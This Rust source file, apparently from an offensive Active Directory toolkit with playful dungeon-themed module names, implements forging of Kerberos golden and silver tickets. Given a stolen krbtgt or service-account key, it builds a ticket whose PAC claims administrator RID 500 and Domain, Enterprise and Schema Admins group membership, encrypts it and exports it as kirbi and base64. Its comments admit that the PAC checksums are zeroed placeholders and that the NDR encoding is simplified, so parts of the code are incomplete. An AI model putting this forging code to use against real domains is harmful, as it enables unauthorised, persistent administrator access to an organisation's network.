use anyhow::{bail, Result};

use crate::dungeon::krb_structures::*;
use crate::dungeon::potions;
use crate::dungeon::wand_utils;

pub struct ForgedTicket {
    pub kirbi: Vec<u8>,
    pub b64:   String,
}

#[derive(Debug, Clone)]
pub struct TicketBlueprint {
    pub username:  String,
    pub domain:    String,
    pub sid:       String,
    pub user_id:   u32,
    pub groups:    Vec<u32>,
    pub extra_sids:Vec<String>,
    pub flags:     u32,
    pub start_time:Option<String>,
    pub end_time:  Option<String>,
    pub service_key: Vec<u8>,
    pub service_etype: i32,
    pub krbtgt_key:  Option<Vec<u8>>,
    pub krbtgt_etype: Option<i32>,
    pub sname:     Option<Glyph>,
    pub srealm:    Option<String>,
    pub session_key_etype: i32,
}

impl Default for TicketBlueprint {
    fn default() -> Self {
        Self {
            username: String::new(),
            domain: String::new(),
            sid: String::new(),
            user_id: 500,
            groups: vec![520, 512, 513, 519, 518],
            extra_sids: Vec::new(),
            flags: TF_FORWARDABLE | TF_RENEWABLE | TF_PRE_AUTHENT,
            start_time: None,
            end_time: None,
            service_key: Vec::new(),
            service_etype: ETYPE_RC4_HMAC,
            krbtgt_key: None,
            krbtgt_etype: None,
            sname: None,
            srealm: None,
            session_key_etype: ETYPE_RC4_HMAC,
        }
    }
}

pub fn forge_golden(bp: &TicketBlueprint) -> Result<ForgedTicket> {
    if bp.service_key.is_empty() { bail!("krbtgt key required for golden ticket"); }
    let sname = bp.sname.clone().unwrap_or_else(|| Glyph::new_krbtgt(&bp.domain));
    let srealm = bp.srealm.clone().unwrap_or_else(|| bp.domain.to_ascii_uppercase());
    forge_ticket_inner(bp, &sname, &srealm, true)
}

pub fn forge_silver(bp: &TicketBlueprint) -> Result<ForgedTicket> {
    if bp.service_key.is_empty() { bail!("service account key required for silver ticket"); }
    let sname = bp.sname.clone().ok_or_else(|| anyhow::anyhow!("sname required for silver ticket"))?;
    let srealm = bp.srealm.clone().unwrap_or_else(|| bp.domain.to_ascii_uppercase());
    forge_ticket_inner(bp, &sname, &srealm, false)
}

fn forge_ticket_inner(bp: &TicketBlueprint, sname: &Glyph, srealm: &str, is_golden: bool) -> Result<ForgedTicket> {
    let session_key_bytes = match bp.session_key_etype {
        ETYPE_AES256_CTS_HMAC_SHA1_96 => wand_utils::random_bytes(32),
        _ => wand_utils::random_bytes(16),
    };
    let session_key = MagicKey { keytype: bp.session_key_etype, keyvalue: session_key_bytes };

    let now = bp.start_time.clone().unwrap_or_else(|| wand_utils::now_minus_seconds(1));
    let end = bp.end_time.clone().unwrap_or_else(|| wand_utils::now_plus_hours(10));
    let renew_till = wand_utils::now_plus_hours(7 * 24);

    let cname = Glyph::new_principal(&bp.username);
    let pac = build_pac(bp, &session_key, is_golden)?;
    let auth_data_inner = encode_sequence(&[
        encode_integer(AD_WIN2K_PAC as i64).as_slice(),
        &encode_octet_string(&pac),
    ].concat());
    let auth_data = encode_sequence(&encode_sequence(&auth_data_inner));
    let vault = ScrollVault {
        flags: bp.flags,
        session_key: session_key.clone(),
        crealm: bp.domain.to_ascii_uppercase(),
        cname: cname.clone(),
        transited: Vec::new(),
        auth_time: now.clone(),
        start_time: Some(now.clone()),
        end_time: end.clone(),
        renew_till: Some(renew_till),
        caddr: None,
        auth_data: Some(auth_data),
    };
    let enc_ticket_bytes = vault.encode();
    let cipher = potions::enchant(bp.service_etype, &bp.service_key, KU_TICKET, &enc_ticket_bytes)?;
    let enc_part = SealedChamber::with_kvno(bp.service_etype, 3, cipher);
    let ticket = Scroll {
        tkt_vno: KRB5_PVNO,
        realm: srealm.to_owned(),
        sname: sname.clone(),
        enc_part,
    };

    let cred_info = KrbCredInfo {
        key: session_key.clone(),
        prealm: Some(bp.domain.to_ascii_uppercase()),
        pname: Some(cname),
        flags: Some(bp.flags),
        auth_time: Some(now.clone()),
        start_time: Some(now),
        end_time: Some(end),
        renew_till: None,
        srealm: Some(srealm.to_owned()),
        sname: Some(sname.clone()),
    };
    let kirbi = build_kirbi(&ticket, cred_info);
    let b64 = wand_utils::kirbi_to_b64(&kirbi);
    Ok(ForgedTicket { kirbi, b64 })
}

// ── Simplified PAC (Windows PAC v1) ──────────────────────────────────────────

fn build_pac(bp: &TicketBlueprint, _session_key: &MagicKey, _is_golden: bool) -> Result<Vec<u8>> {
    // Full PAC implementation requires NDR encoding (KERB_VALIDATION_INFO struct)
    // This builds a minimal PAC sufficient for the enc-part placeholder
    // A production implementation must use proper NDR marshaling per MS-PAC
    let logon_info = build_logon_info_ndr(bp);
    let client_info = build_client_info_ndr(&bp.username);
    let server_cksum_placeholder = vec![0u8; 20]; // HMAC-SHA1-96 placeholder
    let kdc_cksum_placeholder    = vec![0u8; 20];

    let pac_info_buffers = build_pac_buffers(vec![
        (1u32, &logon_info),       // KERB_VALIDATION_INFO
        (10u32, &client_info),     // PAC_CLIENT_INFO
        (6u32, &server_cksum_placeholder), // ServerChecksum
        (7u32, &kdc_cksum_placeholder),    // KDCChecksum
    ]);
    Ok(pac_info_buffers)
}

fn build_pac_buffers(buffers: Vec<(u32, &[u8])>) -> Vec<u8> {
    // MS-PAC PACTYPE header: cBuffers(4) + Version(4) + PACINFOBUFFER[]
    let num_buffers = buffers.len() as u32;
    let header_size = 8 + num_buffers as usize * 16;
    let mut offsets = Vec::new();
    let mut offset = header_size;
    for (_, data) in &buffers {
        offsets.push(offset);
        offset += data.len();
        // align to 8 bytes
        let pad = (8 - (data.len() % 8)) % 8;
        offset += pad;
    }
    let mut out = Vec::new();
    out.extend_from_slice(&num_buffers.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes()); // Version = 0
    for (i, &(buf_type, data)) in buffers.iter().enumerate() {
        out.extend_from_slice(&buf_type.to_le_bytes());
        out.extend_from_slice(&(data.len() as u32).to_le_bytes());
        out.extend_from_slice(&(offsets[i] as u64).to_le_bytes());
    }
    for (_, data) in &buffers {
        out.extend_from_slice(data);
        let pad = (8 - (data.len() % 8)) % 8;
        out.extend_from_slice(&vec![0u8; pad]);
    }
    out
}

fn build_logon_info_ndr(bp: &TicketBlueprint) -> Vec<u8> {
    // Minimal NDR encoding of KERB_VALIDATION_INFO
    // Fields: LogonTime, LogoffTime, KickOffTime, PasswordLastSet, PasswordCanChange,
    //         PasswordMustChange, EffectiveName, FullName, LogonScript, ...
    // For a research/lab environment, most optional fields can be zeroed
    let mut ndr = Vec::new();
    // NDR version header (common header + private header)
    ndr.extend_from_slice(&[0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); // NDR common
    ndr.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); // private header size placeholder
    // FILETIME for LogonTime (now)
    let filetime_now = unix_to_filetime(chrono::Utc::now().timestamp());
    let filetime_never = 0x7FFF_FFFF_FFFF_FFFFu64;
    ndr.extend_from_slice(&filetime_now.to_le_bytes());   // LogonTime
    ndr.extend_from_slice(&filetime_never.to_le_bytes()); // LogoffTime
    ndr.extend_from_slice(&filetime_never.to_le_bytes()); // KickOffTime
    ndr.extend_from_slice(&0u64.to_le_bytes());           // PasswordLastSet
    ndr.extend_from_slice(&0u64.to_le_bytes());           // PasswordCanChange
    ndr.extend_from_slice(&filetime_never.to_le_bytes()); // PasswordMustChange
    // RPC_UNICODE_STRING structures (Length, MaxLength, ReferentId)
    let name_utf16: Vec<u8> = bp.username.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let domain_utf16: Vec<u8> = bp.domain.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let netbios_domain = bp.domain.split('.').next().unwrap_or(&bp.domain).to_ascii_uppercase();
    let netbios_utf16: Vec<u8> = netbios_domain.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    for utf16 in &[&name_utf16, &vec![], &vec![], &vec![], &vec![], &vec![]] {
        let len = utf16.len() as u16;
        ndr.extend_from_slice(&len.to_le_bytes());
        ndr.extend_from_slice(&len.to_le_bytes()); // MaxLength
        ndr.extend_from_slice(&0x00_04u32.to_le_bytes()); // referent ID placeholder
    }
    // LogonCount, BadPasswordCount, UserId, PrimaryGroupId
    ndr.extend_from_slice(&0u16.to_le_bytes()); // LogonCount
    ndr.extend_from_slice(&0u16.to_le_bytes()); // BadPasswordCount
    ndr.extend_from_slice(&bp.user_id.to_le_bytes());
    ndr.extend_from_slice(&513u32.to_le_bytes()); // PrimaryGroupId
    // GroupCount + referent
    ndr.extend_from_slice(&(bp.groups.len() as u32).to_le_bytes());
    ndr.extend_from_slice(&0x00_08u32.to_le_bytes()); // Groups referent
    // UserFlags
    ndr.extend_from_slice(&0u32.to_le_bytes());
    // UserSessionKey (16 zeros)
    ndr.extend_from_slice(&[0u8; 16]);
    // LogonServer, LogonDomainName (RPC_UNICODE_STRING)
    for utf16 in &[&vec![], &domain_utf16] {
        let len = utf16.len() as u16;
        ndr.extend_from_slice(&len.to_le_bytes());
        ndr.extend_from_slice(&len.to_le_bytes());
        ndr.extend_from_slice(&0x00_0cu32.to_le_bytes());
    }
    // LogonDomainId (SID referent)
    ndr.extend_from_slice(&0x00_10u32.to_le_bytes());
    // Reserved fields
    ndr.extend_from_slice(&[0u8; 40]);
    // Actual data (simplified — strings + groups + SID)
    for utf16 in &[&name_utf16, &netbios_utf16] {
        let len = utf16.len() as u32;
        ndr.extend_from_slice(&len.to_le_bytes());
        ndr.extend_from_slice(utf16);
        let pad = (4 - (utf16.len() % 4)) % 4;
        ndr.extend_from_slice(&vec![0u8; pad]);
    }
    // Groups array
    for gid in &bp.groups {
        ndr.extend_from_slice(&gid.to_le_bytes());
        ndr.extend_from_slice(&7u32.to_le_bytes()); // SE_GROUP_* attributes
    }
    // SID (from bp.sid string like "S-1-5-21-...")
    ndr.extend_from_slice(&encode_sid(&bp.sid));
    ndr
}

fn build_client_info_ndr(username: &str) -> Vec<u8> {
    let filetime = unix_to_filetime(chrono::Utc::now().timestamp());
    let name_utf16: Vec<u8> = username.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let mut ndr = Vec::new();
    ndr.extend_from_slice(&filetime.to_le_bytes());
    ndr.extend_from_slice(&(name_utf16.len() as u16).to_le_bytes());
    ndr.extend_from_slice(&name_utf16);
    ndr
}

fn unix_to_filetime(unix: i64) -> u64 {
    const EPOCH_DIFF: u64 = 11_644_473_600;
    ((unix as u64 + EPOCH_DIFF) * 10_000_000) as u64
}

fn encode_sid(sid: &str) -> Vec<u8> {
    // S-1-5-21-x-x-x-y or S-1-5-21-x-x-x
    let mut out = Vec::new();
    let parts: Vec<&str> = sid.split('-').collect();
    if parts.len() < 3 { return vec![1, 0, 0, 0, 0, 0, 0, 5]; }
    let revision: u8 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(1);
    let authority: u64 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
    let sub_authorities: Vec<u32> = parts[3..].iter()
        .filter_map(|s| s.parse().ok())
        .collect();
    out.push(revision);
    out.push(sub_authorities.len() as u8);
    out.extend_from_slice(&[0u8; 2]);
    out.extend_from_slice(&authority.to_be_bytes()[2..]);
    for sub in &sub_authorities {
        out.extend_from_slice(&sub.to_le_bytes());
    }
    out
}
